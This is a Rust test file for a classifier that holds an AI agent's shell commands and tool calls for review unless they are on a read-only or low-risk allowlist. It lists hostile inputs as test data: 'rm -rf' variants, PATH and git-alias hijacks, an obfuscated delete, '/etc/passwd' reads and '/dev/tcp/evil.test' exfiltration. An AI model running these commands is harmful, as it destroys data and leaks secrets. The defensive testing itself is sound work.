//! Release re-review (round 2): the Pet companion classifier is an ALLOWLIST.
//!
//! * A: a shell command is ordinary only when every simple command is on the
//!   read-only allowlist — build tools, task runners, interpreters, wrappers,
//!   shell-state changes, obfuscation and paths in command position all park.
//! * B: an internal tool above `ReadOnly` is ordinary only when it is on the
//!   low-risk reversible allowlist (or a delegation tool); everything else
//!   parks. Composio per-action tools are classified by their slug.
//! * R4: the redactor's `<HOME>` placeholder is read as a path word.

use super::*;
use crate::neppy::pet::companion::types::ActionCategory as C;
use serde_json::json;

fn shell(command: &str) -> Option<C> {
    pet_companion_high_risk("shell", &json!({ "command": command }))
}

#[test]
fn everything_off_the_read_only_allowlist_parks() {
    for command in [
        // Build tools / task runners run arbitrary project code.
        "make",
        "make test",
        "npm run build",
        "npm test",
        "npx some-tool",
        "uvx ruff check",
        "cargo run",
        "cargo test",
        "cargo build",
        "go run .",
        "pytest -q",
        "just deploy",
        "./gradlew build",
        // Interpreters, wrappers, multiplexers.
        "busybox rm -rf x",
        "python3 -m http.server",
        "env",
        "env ls",
        "xargs echo",
        "time cargo build",
        // Paths / expansion in command position (symlink tricks, obfuscation).
        "./ls",
        "/tmp/x/cat notes",
        "~/bin/ls",
        "{ls,-la}",
        "$'\\x72m' -rf x",
        "l?",
        "c*t x",
        // Shell-state changes.
        "IFS=, ls",
        "FOO=1 ls",
        "PATH=/tmp/evil:$PATH; ls",
        "alias ls='rm -rf'",
        "trap 'rm -rf x' EXIT",
        "function f { rm x; }",
        "f() { rm x; }",
        "coproc rm x",
        // Git: config/alias tricks, hooks and writes.
        "git -c alias.st='!rm -rf x' st",
        "git -c core.pager=evil log",
        "git --exec-path=/tmp log",
        "git bisect run ./evil.sh",
        "git submodule foreach 'rm -rf .'",
        "git commit -m wip",
        "git add -A",
        "git stash",
        "git switch main",
        "git branch feature",
        "git diff --output=/tmp/x",
        "git diff --ext-diff",
        // Writes through otherwise read-only commands.
        "echo hi >> notes.md",
        "sort -o out.txt in.txt",
        "rg --pre ./evil.sh foo",
        "uniq in.txt out.txt",
        "tree -o out.txt",
        "find . -fprint out.txt",
        "mv -n a.md b.md",
        "cp --no-clobber a b",
        "touch x",
        "mkdir build",
    ] {
        assert!(shell(command).is_some(), "`{command}` must park");
    }
}

#[test]
fn recognisable_commands_keep_their_precise_label() {
    for (command, want) in [
        ("rm -rf build", C::Delete),
        ("FOO=1 rm x", C::Delete),
        ("git push origin main", C::Publish),
        ("git reset --hard", C::Irreversible),
        ("echo hi > notes.md", C::Irreversible),
        ("curl https://x.test", C::SharePersonalInfo),
        ("brew install jq", C::Install),
        ("defaults write x y", C::SystemSettings),
        ("cargo build", C::PrivilegedCommand),
    ] {
        assert_eq!(shell(command), Some(want), "{command}");
    }
}

/// Round 4, item 2: classification reads the RAW arguments. A home path
/// classifies the same raw or redacted, and content hidden inside what the
/// redactor would swallow as a home-path "username" segment is still seen.
#[test]
fn classification_reads_raw_arguments() {
    let redact = super::super::redact::redact_args;
    // Shell: the raw command gets its real label. (The redacted copy reads
    // `<HOME>` as redirects and would mislabel it — one reason the gate no
    // longer classifies the audit copy.) Both park either way.
    let ls = json!({ "command": "ls -la /Users/alice/projects/app" });
    assert_eq!(
        pet_companion_high_risk("shell", &ls),
        Some(C::PrivilegedCommand)
    );
    assert!(pet_companion_high_risk("shell", &redact(&ls)).is_some());
    for (tool, raw) in [
        (
            "composio_execute",
            json!({ "tool": "GMAIL_SEND_EMAIL", "arguments": {"path": "/Users/alice/x"} }),
        ),
        (
            "http_request",
            json!({ "method": "GET", "url": "file:///Users/alice/notes" }),
        ),
    ] {
        assert_eq!(
            pet_companion_high_risk(tool, &raw),
            pet_companion_high_risk(tool, &redact(&raw)),
            "{tool} {raw}"
        );
        assert!(
            pet_companion_high_risk(tool, &raw).is_some(),
            "{tool} parks"
        );
    }
    // `scrub_paths` swallows everything up to the next `/` after `/Users/` —
    // here the `rm`. The raw command still reads as a delete.
    let raw = json!({ "command": "ls /Users/x;rm -rf ~/y" });
    let redacted = redact(&raw);
    assert!(
        !redacted["command"].as_str().unwrap().contains("rm"),
        "precondition: the redactor hides the rm: {redacted}"
    );
    assert_eq!(pet_companion_high_risk("shell", &raw), Some(C::Delete));
}

/// Round 3, item 1: a CLOSED tool-name allowlist. Every name on it is
/// ordinary; everything else parks with its sharpest label — browser, push
/// notifications, mail, web fetch / search, task-board and memory writers,
/// workspace edits, scheduling — whatever level or effect the tool reports.
#[test]
fn only_names_on_the_closed_allowlist_are_ordinary() {
    for tool in PET_COMPANION_ALLOWED_TOOLS {
        assert_eq!(pet_companion_high_risk(tool, &json!({})), None, "{tool}");
    }
    assert_eq!(
        pet_companion_high_risk("tinyjuice_retrieve", &json!({})),
        None
    );
    let parked: Vec<(&str, serde_json::Value, C)> = vec![
        ("browser", json!({"action": "click"}), C::PrivilegedCommand),
        (
            "browser",
            json!({"action": "screenshot"}),
            C::PrivilegedCommand,
        ),
        ("browser_open", json!({}), C::PrivilegedCommand),
        ("pushover", json!({}), C::SendMessage),
        ("gmail_unsubscribe", json!({}), C::Irreversible),
        ("web_fetch", json!({}), C::SharePersonalInfo),
        ("web_search_tool", json!({}), C::SharePersonalInfo),
        ("gitbooks_search", json!({}), C::SharePersonalInfo),
        (
            "http_request",
            json!({"method": "GET"}),
            C::SharePersonalInfo,
        ),
        ("update_task", json!({}), C::Irreversible),
        ("goal_set", json!({}), C::Irreversible),
        ("schedule", json!({"action": "create"}), C::SystemSettings),
        ("cron_add", json!({}), C::SystemSettings),
        ("update_memory_md", json!({}), C::Irreversible),
        ("memory_store", json!({}), C::Irreversible),
        ("write_notes", json!({}), C::Irreversible),
        ("save_preference", json!({}), C::Irreversible),
        ("edit_workflow", json!({}), C::Irreversible),
        ("file_write", json!({"path": "a.md"}), C::Irreversible),
        ("edit", json!({}), C::Irreversible),
        ("apply_patch", json!({}), C::Irreversible),
        ("read_diff", json!({}), C::Irreversible),
        (
            "git_operations",
            json!({"operation": "commit"}),
            C::Irreversible,
        ),
        (
            "git_operations",
            json!({"operation": "branch"}),
            C::Irreversible,
        ),
        ("git_operations", json!({"operation": "push"}), C::Publish),
        (
            "git_operations",
            json!({"operation": "stash", "action": "drop"}),
            C::Delete,
        ),
        ("web3_dapp_execute", json!({}), C::Purchase),
        ("GMAIL_SEND_EMAIL", json!({}), C::SendMessage),
        ("GMAIL_FETCH_EMAILS", json!({}), C::SharePersonalInfo),
        ("GITHUB_CREATE_ISSUE", json!({}), C::Irreversible),
        // Round 4 removals.
        ("todo_add", json!({}), C::Irreversible),
        ("todo_edit", json!({}), C::Irreversible),
        ("todo_update_status", json!({}), C::Irreversible),
        ("todo_replace", json!({}), C::Irreversible),
        ("todo_decide_plan", json!({}), C::Irreversible),
        ("continue_subagent", json!({}), C::Irreversible),
        ("request_plan_review", json!({}), C::Irreversible),
        ("plan_exit", json!({}), C::Irreversible),
        // A read-verb name is not enough: it must be on the list.
        ("get_and_forward", json!({}), C::SendMessage),
        ("list_secrets", json!({}), C::Irreversible),
    ];
    for (tool, args, want) in parked {
        assert_eq!(
            pet_companion_high_risk(tool, &args),
            Some(want),
            "{tool} {args}"
        );
    }
    // Even read-only git honours repository config that can launch programs.
    for op in ["status", "diff", "log"] {
        assert_eq!(
            pet_companion_high_risk("git_operations", &json!({ "operation": op })),
            Some(C::PrivilegedCommand),
            "{op}"
        );
    }
}

/// Delegation is ordinary only when it runs blocking — inside this turn,
/// under this origin: a Chat turn, or `spawn_subagent` with `blocking: true`.
#[tokio::test]
async fn delegation_is_ordinary_only_when_blocking() {
    use crate::neppy::threads::mode::{with_turn_mode, ThreadMode};
    let chat = with_turn_mode(ThreadMode::Chat, async {
        (
            pet_companion_high_risk("spawn_subagent", &json!({})),
            pet_companion_high_risk("delegate_researcher", &json!({})),
        )
    })
    .await;
    assert_eq!(chat, (None, None));
    let orch = with_turn_mode(ThreadMode::Orchestration, async {
        (
            pet_companion_high_risk("spawn_subagent", &json!({})),
            pet_companion_high_risk("spawn_subagent", &json!({"blocking": true})),
            pet_companion_high_risk("delegate_researcher", &json!({})),
        )
    })
    .await;
    assert_eq!(orch, (Some(C::Irreversible), None, Some(C::Irreversible)));
    // No declared mode (not a Pet turn shape): not provably blocking.
    assert_eq!(
        pet_companion_high_risk("delegate_researcher", &json!({})),
        Some(C::Irreversible)
    );
}

/// Round 3, item 2: the shell read-only rule — no `sort` / `uniq` / `rg` /
/// `less` / `more`; input only from a plain relative file; no network
/// pseudo-devices; git limited to forms that run no repo-configured program.
#[test]
fn round_three_shell_rule() {
    for command in [
        "sort a.txt",
        "uniq a.txt",
        "rg foo",
        "less a.txt",
        "more a.txt",
        "cat < /etc/passwd",
        "cat < ../secret",
        "cat < ~/x",
        "wc -l < $FILE",
        "cat <<EOF",
        "cat <<< hi",
        "cat < /dev/tcp/evil.test/80",
        "echo hi > /dev/tcp/evil.test/80",
        "git diff",
        "git diff --no-ext-diff",
        "git show HEAD",
        "git log -p",
        "git branch -a",
        "git remote -v",
        "git stash list",
        "git rev-parse HEAD",
        "git -c core.fsmonitor=x status",
    ] {
        assert!(shell(command).is_some(), "`{command}` must park");
    }
    assert_eq!(
        shell("cat < /dev/tcp/evil.test/80"),
        Some(C::SharePersonalInfo)
    );
    assert_eq!(
        shell("cat < notes/input.txt"),
        Some(C::PrivilegedCommand),
        "round 4: even a plain relative input redirect parks"
    );
    // git always parks under the Pet: repository config (core.fsmonitor, diff
    // drivers) can launch programs even for read-only verbs.
    for command in [
        "git status",
        "git -C repo status --short",
        "git log --oneline -5",
        "git log -p --no-textconv --no-ext-diff",
        "git diff --no-ext-diff --no-textconv",
        "git show --no-textconv HEAD",
    ] {
        assert!(shell(command).is_some(), "`{command}` must park");
    }
}
